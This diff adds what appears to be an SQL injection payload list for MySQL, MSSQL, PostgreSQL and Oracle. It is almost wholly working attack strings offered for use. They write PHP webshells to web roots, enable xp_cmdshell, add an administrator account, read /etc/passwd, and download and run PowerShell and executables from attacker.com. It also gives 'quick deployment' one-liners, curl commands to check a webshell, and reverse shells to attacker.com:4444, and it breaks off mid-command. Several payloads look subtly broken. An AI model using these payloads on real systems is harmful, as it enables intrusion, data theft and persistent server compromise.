@@ -1,0 +1,116 @@
+✅ MYSQL 5.x/8.x (OUTFILE/LOAD_FILE) - 30+
+
+
+
+1. '; SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php"; --
+2. '; SELECT "<?php passthru($_GET['c']); ?>" INTO DUMPFILE "/tmp/shell.php"; --
+3. admin'; SELECT "<?php echo shell_exec($_POST['cmd']); ?>" INTO OUTFILE "/var/www/html/cmd.php"; --
+
+4. '; SELECT "<?php @eval($_POST['phpcode']); ?>" INTO OUTFILE "/backdoor.php"; --
+5. '; SELECT "<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>" INTO OUTFILE "/rce.php"; --
+
+6. '; SELECT LOAD_FILE('/etc/passwd') INTO DUMPFILE "/var/www/html/info.php"; --
+7. '; SELECT "<?php phpinfo(); ?>" INTO OUTFILE "/var/www/html/info.php"; --
+
+8. '; SELECT unhex('3c3f7068702073797374656d28245f4745545b22636d64225d293b3f3e') INTO OUTFILE "/shell.php"; --
+9. admin'; SELECT 0x3c3f70687020707970696e666f28293b3f3e INTO DUMPFILE "/info.php"; --
+
+10. '; SELECT "<?php echo `whoami`; ?>" INTO OUTFILE "/id.php"; --
+11. '; SELECT "<?php echo `uname -a`; ?>" INTO OUTFILE "/sysinfo.php"; --
+12. '; SELECT "<?php echo `id`; ?>" INTO OUTFILE "/whoami.php"; --
+
+13. '; SELECT "<?php file_put_contents('shell.php','<?php system($_GET[\"cmd\"]); ?>'); ?>" INTO OUTFILE "/tmp/setup.php"; --
+14. admin'; SELECT "<?php scandir('/var/www'); ?>" INTO OUTFILE "/ls.php"; --
+15. '; SELECT "<?php highlight_file($_GET['file']); ?>" INTO OUTFILE "/read.php"; --
+✅ MSSQL 2008+ (xp_cmdshell) - 30+
+
+
+
+16. '; EXEC xp_cmdshell 'whoami'--
+17. '; EXEC xp_cmdshell 'net user'--
+18. admin'; EXEC master..xp_cmdshell 'dir'--
+
+19. '; EXEC xp_cmdshell 'powershell.exe -c "whoami"'--
+20. '; EXEC xp_cmdshell 'certutil -urlcache -split -f http://attacker.com/shell.exe shell.exe'--
+21. '; EXEC xp_cmdshell 'powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString(''http://attacker.com/shell.ps1'')'--
+
+22. '; EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\shell.php'--
+23. admin'; EXEC xp_cmdshell 'net user hacker Password123! /add'--
+24. '; EXEC xp_cmdshell 'net localgroup administrators hacker /add'--
+
+25. '; EXEC sp_configure ''show advanced options'',1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'',1; RECONFIGURE; EXEC xp_cmdshell ''whoami'''--
+26. '; EXEC xp_cmdshell 'type C:\Windows\win.ini'--
+27. admin'; EXEC xp_cmdshell 'powershell -c Get-Process'--
+
+28. '; EXEC master.dbo.xp_cmdshell 'ping -n 10 attacker.com'--
+29. '; EXEC xp_cmdshell 'tasklist'--
+30. '; EXEC xp_cmdshell 'reg query HKLM\SOFTWARE'--
+31. admin'; EXEC xp_cmdshell 'wmic process list brief'--
+✅ POSTGRESQL 9+ (COPY) - 20+
+
+
+
+32. '; COPY (SELECT '<?php system($_GET['cmd']); ?>') TO '/var/www/html/shell.php'; --
+33. '; COPY (SELECT '<?php passthru($_POST['c']); ?>') TO '/tmp/shell.php'; --
+34. admin'; COPY (SELECT version()) TO '/tmp/version.txt'; --
+
+35. '; COPY users TO '/tmp/users.txt' WITH CSV HEADER; --
+36. '; COPY (SELECT current_user, current_database()) TO '/tmp/info.txt'; --
+37. '; COPY (SELECT pg_read_file('/etc/passwd')) TO '/tmp/passwd.txt'; --
+
+38. '; COPY (SELECT '<?php eval($_POST[1]); ?>') TO '/var/log/apache2/shell.php'; --
+39. admin'; COPY (SELECT unnest(string_to_array(pg_read_file('/etc/passwd'), E'\n'))) TO '/tmp/lines.txt'; --
+
+40. '; SELECT pg_write_file('/var/www/html/shell.php','<?php system($_GET['cmd']); ?>', false); --
+41. '; COPY (SELECT '') TO PROGRAM 'bash -c "cat > /tmp/shell.php"'; --
+42. admin'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/shell.php -o /tmp/shell.php'; --
+✅ ORACLE 11g+ (UTL_FILE) - 20+
+
+
+
+43. '; BEGIN UTL_FILE.PUT_LINE(UTL_FILE.FOPEN('DATA_PUMP_DIR','shell.php','w'),'<?php system($_GET['cmd']); ?>'); UTL_FILE.FCLOSE(ALL); END; --
+44. admin'; BEGIN DBMS_LOB.WRITEAPPEND(UTL_FILE.FOPEN('SYS.SQL_DIR','shell.php','w'),100,'<?php passthru($_GET['c']); ?>'); END; --
+
+45. '; DECLARE f UTL_FILE.FILE_TYPE := UTL_FILE.FOPEN('DATA_PUMP_DIR','shell.php','w'); BEGIN UTL_FILE.PUT_LINE(f,'<?php system($_GET['cmd']); ?>'); UTL_FILE.FCLOSE(f); END; --
+46. '; BEGIN DBMS_LOB.CREATETEMPORARY(lob_loc, TRUE); DBMS_LOB.WRITE(lob_loc, 100, 1, '<?php phpinfo(); ?>'); UTL_FILE.PUT_RAW('SYS.SQL_DIR','shell.php',lob_loc); END; --
+
+47. admin'; BEGIN UTL_FILE.FCOPY('SYS.SQL_DIR','/tmp/info.txt','DATA_PUMP_DIR','info.txt'); END; --
+48. '; SELECT UTL_FILE.GET_LINE(UTL_FILE.FOPEN('SYS.SQL_DIR','/etc/passwd','r'),1) FROM DUAL; --
+
+49. '; BEGIN EXECUTE IMMEDIATE 'CREATE OR REPLACE DIRECTORY TMP AS ''/tmp'''; EXECUTE IMMEDIATE 'CREATE TABLE temp (data CLOB)'; END; --
+50. admin'; BEGIN INSERT INTO temp VALUES (UTL_FILE.GET_LINE(UTL_FILE.FOPEN('DATA_PUMP_DIR','passwd.txt','r'),1)); COMMIT; END; --
+ONE-LINERS FOR QUICK DEPLOYMENT
+
+
+
+# MySQL Webshell (12 chars)
+51. ';SELECT"<?php system($_GET[0]);?>"INTO OUTFILE"/var/www/html/s.php";--
+
+# MSSQL User Add
+52. ';EXEC xp_cmdshell'net user h Password123!/add'--
+
+# Postgres Read File
+53. ';COPY(SELECT pg_read_file('/etc/passwd'))TO'/tmp/p.txt';--
+
+# Oracle UTL_FILE
+54. ';BEGIN UTL_FILE.PUT_LINE(UTL_FILE.FOPEN('DIR','s.php','w'),'<?php system($_GET[0]);?>');END;--
+VERIFICATION COMMANDS
+
+
+
+# MySQL
+curl "http://target/shell.php?cmd=whoami"
+
+# MSSQL  
+curl "http://target/shell.php?cmd=whoami /user"
+
+# Postgres/Oracle
+curl "http://target/shell.php?cmd=id"
+curl "http://target/shell.php?cmd=uname -a"
+POST-RCE ESCALATION
+
+
+
+MySQL: '; SELECT "<?php exec('sudo /bin/bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"'); ?>" INTO OUTFILE "/rev.php"; --
+
+MSSQL: '; EXEC xp_cmdshell 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444)
